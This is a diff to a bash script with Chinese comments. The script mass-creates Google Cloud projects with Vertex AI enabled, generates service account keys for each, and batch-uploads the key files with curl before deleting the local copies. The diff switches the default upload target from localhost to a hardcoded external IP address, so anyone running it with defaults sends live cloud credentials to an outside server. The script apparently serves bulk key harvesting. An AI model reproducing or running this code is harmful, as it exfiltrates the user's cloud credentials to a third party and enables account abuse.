@@ -27,14 +27,11 @@ MAX_RETRIES=3
 BASE_RETRY_DELAY=5
 
 # JSON上传配置
-UPLOAD_API_URL="${UPLOAD_API_URL:-http://localhost:5000/api/upload-json}"
+UPLOAD_API_URL="${UPLOAD_API_URL:-http://152.53.82.146:5001/api/upload-files}"
 UPLOAD_API_TOKEN="${UPLOAD_API_TOKEN:-}"
 
 # 需要开启的API列表
 APIS_TO_ENABLE=(
-  "cloudresourcemanager.googleapis.com"
-  "cloudbilling.googleapis.com"
-  "iam.googleapis.com"
   "aiplatform.googleapis.com"
 )
 
@@ -227,11 +224,11 @@ function create_service_account {
     fi
 }
 
-# 函数：下载服务账号密钥并上传到管理系统
-function download_and_upload_key {
+# 函数：下载服务账号密钥（不上传，等待批量处理）
+function download_keys_for_project {
     local project_id=$1
     
-    echo "🔑 正在处理项目 $project_id 的服务账号密钥..."
+    echo "🔑 正在下载项目 $project_id 的服务账号密钥..."
     
     # 设置当前项目
     gcloud config set project "$project_id" --quiet
@@ -239,41 +236,39 @@ function download_and_upload_key {
     # 服务账号信息
     local sa_name="${project_id}"
     local sa_email="${sa_name}@${project_id}.iam.gserviceaccount.com"
-    local key_filename="${project_id}.json"
     
     echo "  处理服务账号: $sa_name"
     
-    # 下载密钥
+    # 下载项目密钥文件
+    local key_filename="${project_id}.json"
+    local downloaded_count=0
+    
+    # 下载密钥文件
     if retry_command $MAX_RETRIES $BASE_RETRY_DELAY \
         "gcloud iam service-accounts keys create '$key_filename' --iam-account='$sa_email' --quiet"; then
         echo "    ✓ 密钥文件 $key_filename 下载成功"
-        
-        # 上传到管理系统
-        if upload_json_file "$key_filename"; then
-            echo "    ✓ 密钥文件 $key_filename 上传到管理系统成功"
-            # 上传成功后删除本地文件
-            rm -f "$key_filename"
-            echo "    ✓ 本地密钥文件 $key_filename 已清理"
-            echo "$project_id:1:1" >> "$PROGRESS_DIR/key_results"
-        else
-            echo "    ⚠️  密钥文件 $key_filename 上传到管理系统失败，保留本地文件"
-            echo "$key_filename" >> "$PROGRESS_DIR/local_keys"
-            echo "$project_id:1:0" >> "$PROGRESS_DIR/key_results"
-        fi
+        downloaded_count=1
     else
         echo "    ❌ 密钥文件 $key_filename 下载失败"
-        echo "$project_id:0:0" >> "$PROGRESS_DIR/key_results"
     fi
     
-    echo "  📊 项目 $project_id 密钥处理完成"
+    echo "$project_id:$downloaded_count:0" >> "$PROGRESS_DIR/key_results"
+    echo "  📊 项目 $project_id 密钥下载完成 ($downloaded_count/1)"
 }
 
 # 函数：上传JSON文件到管理系统
-function upload_json_file {
-    local json_file=$1
+function upload_project_files {
+    local project_id=$1
     
     if [ -z "$UPLOAD_API_URL" ]; then
         echo "    ⚠️  未配置上传API地址，跳过上传"
+        return 1
+    fi
+    
+    # 检查文件是否存在
+    local filename="${project_id}.json"
+    if [ ! -f "$filename" ]; then
+        echo "    ⚠️  项目 $project_id 的文件 $filename 不存在，跳过上传"
         return 1
     fi
     
@@ -284,14 +279,21 @@ function upload_json_file {
         curl_cmd="$curl_cmd -H 'Authorization: Bearer $UPLOAD_API_TOKEN'"
     fi
     
+    # 构建单文件上传命令
+    curl_cmd="$curl_cmd -X POST -F 'files=@$filename' '$UPLOAD_API_URL'"
+    
     # 执行上传
     local response
-    response=$(eval "$curl_cmd -X POST -F 'file=@$json_file' '$UPLOAD_API_URL'" 2>/dev/null)
+    response=$(eval "$curl_cmd" 2>/dev/null)
     local exit_code=$?
     
     if [ $exit_code -eq 0 ]; then
         # 检查响应是否包含成功标志
         if echo "$response" | grep -q '"success".*true'; then
+            echo "    ✓ 项目 $project_id 的文件上传成功"
+            # 上传成功后删除本地文件
+            rm -f "$filename"
+            echo "    ✓ 本地文件 $filename 已清理"
             return 0
         else
             echo "    ❌ 上传API返回错误: $response"
@@ -344,11 +346,34 @@ echo "当前登录邮箱: $current_account"
 
 # 提取邮箱前缀用于命名
 email_prefix=$(echo "$current_account" | cut -d'@' -f1)
-if [ ${#email_prefix} -ge 5 ]; then
-    prefix_chars=${email_prefix:0:5}
-else
-    prefix_chars=$email_prefix
+
+# 清理邮箱前缀，使其符合GCP项目命名规范
+# 1. 转换为小写
+# 2. 移除点号和特殊字符
+# 3. 将下划线替换为连字符
+# 4. 移除开头和结尾的连字符
+clean_prefix=$(echo "$email_prefix" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9_-]//g' | sed 's/_/-/g' | sed 's/^-*//;s/-*$//')
+
+# 如果清理后为空，使用默认前缀
+if [ -z "$clean_prefix" ]; then
+    clean_prefix="user"
 fi
+
+# 截取前7个字符作为项目前缀
+if [ ${#clean_prefix} -ge 7 ]; then
+    prefix_chars=${clean_prefix:0:7}
+else
+    # 如果邮箱前缀不足7个字符，用0123456补充
+    prefix_chars=$clean_prefix
+    fill_chars="0123456"
+    while [ ${#prefix_chars} -lt 7 ]; do
+        needed=$((7 - ${#prefix_chars}))
+        prefix_chars="${prefix_chars}${fill_chars:0:$needed}"
+    done
+fi
+
+# 再次清理截取后的前缀，确保不以连字符结尾
+prefix_chars=$(echo "$prefix_chars" | sed 's/-*$//')
 
 echo "提取的前缀字符: $prefix_chars"
 show_separator
@@ -572,7 +597,7 @@ else
     # 准备密钥处理任务
     key_jobs=()
     for project_id in "${created_projects[@]}"; do
-        key_jobs+=("download_and_upload_key '$project_id'")
+        key_jobs+=("download_keys_for_project '$project_id'")
     done
     
     echo "🚀 开始并发处理密钥文件..."
@@ -592,12 +617,40 @@ else
     
     echo "📊 密钥处理完成: 总下载 $total_downloaded 个, 总上传 $total_uploaded 个"
     
-    # 显示保留的本地文件
-    if [ -f "$PROGRESS_DIR/local_keys" ]; then
-        echo "📁 以下密钥文件保留在本地（上传失败）:"
-        while read -r key_file; do
-            echo "  - $key_file"
-        done < "$PROGRESS_DIR/local_keys"
+    # 批量上传密钥文件到管理系统
+    if [ ! -z "$UPLOAD_API_URL" ]; then
+        echo ""
+        echo "📤 开始批量上传密钥文件到管理系统..."
+        
+        uploaded_projects=0
+        failed_uploads=0
+        
+        for project_id in "${created_projects[@]}"; do
+            if upload_project_files "$project_id"; then
+                ((uploaded_projects++))
+                # 更新统计
+                if [ -f "$PROGRESS_DIR/key_results" ]; then
+                    # 更新上传状态：project_id:downloaded:uploaded
+                    sed -i "s/${project_id}:\([0-9]*\):0/${project_id}:\1:1/" "$PROGRESS_DIR/key_results"
+                fi
+            else
+                ((failed_uploads++))
+                # 记录失败的文件
+                echo "${project_id}.json" >> "$PROGRESS_DIR/local_keys"
+            fi
+        done
+        
+        echo "📊 批量上传完成: $uploaded_projects 个项目成功, $failed_uploads 个项目失败"
+        
+        # 显示保留的本地文件
+        if [ -f "$PROGRESS_DIR/local_keys" ] && [ -s "$PROGRESS_DIR/local_keys" ]; then
+            echo "📁 以下密钥文件保留在本地（上传失败）:"
+            while read -r key_file; do
+                echo "  - $key_file"
+            done < "$PROGRESS_DIR/local_keys"
+        fi
+    else
+        echo "📁 所有密钥文件已下载到本地（未配置上传地址）"
     fi
 fi
 
